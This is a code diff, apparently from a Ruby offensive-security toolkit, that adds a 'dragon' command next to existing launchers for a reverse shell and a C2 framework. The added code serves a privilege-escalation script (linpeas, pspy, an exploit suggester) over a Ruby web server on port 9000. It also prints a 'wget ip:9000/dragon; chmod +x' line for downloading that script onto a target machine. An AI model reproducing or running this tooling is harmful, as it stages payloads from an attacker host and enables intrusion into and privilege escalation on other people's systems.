@@ -41,6 +41,7 @@ if command == "help" || command == "?"
        
    [\e[1;35m*\e[0m] \e[31mmyrshell\e[0m  =>  \e[41mTo Run MyRevShell\e[0m
    [\e[1;35m*\e[0m] \e[31mc2\e[0m  =>  \e[41mTo Run Chacal-C2\e[0m
+   [\e[1;35m*\e[0m] \e[31mdragon\e[0m  =>  \e[41mTo Run Dragon\e[0m
 
         HOW TO USE
        ============
@@ -71,6 +72,29 @@ end
 #chacal-c2
 if command == "c2"
    system("bash ~/.sith/chacal-c2/chacal")
+end
+
+#dragon
+if command == "dragon"
+  puts "
+======================================================
+  
+    [\e[31m*\e[0m] Dragon Help
+    
+     [\e[31m+\e[0m] \e[032m -h --help\e[0m   -   HELP
+     [\e[31m+\e[0m] \e[032m -m\e[0m          -   MACHINE INFORMATIONS
+     [\e[31m+\e[0m] \e[032m -c\e[0m          -   CRONTAB INFORMATIONS
+     [\e[31m+\e[0m] \e[032m -t\e[0m          -   LIST SOME TOOLS
+     [\e[31m+\e[0m] \e[032m -p\e[0m          -   EXECUTE PSPY
+     [\e[31m+\e[0m] \e[032m -lp\e[0m         -   EXECUTE LINPEAS
+     [\e[31m+\e[0m] \e[032m -es\e[0m         -   EXECUTE EXPLOIT SUGGESTER
+
+======================================================
+
+>\e[032m wget \e[33mip\e[032m:9000/dragon; chmod +x dragon \e[0m
+
+"
+  system("ruby -run -ehttpd ~/.sith/drag0n/dragon -p 9000")
 end
 
 #dproxy
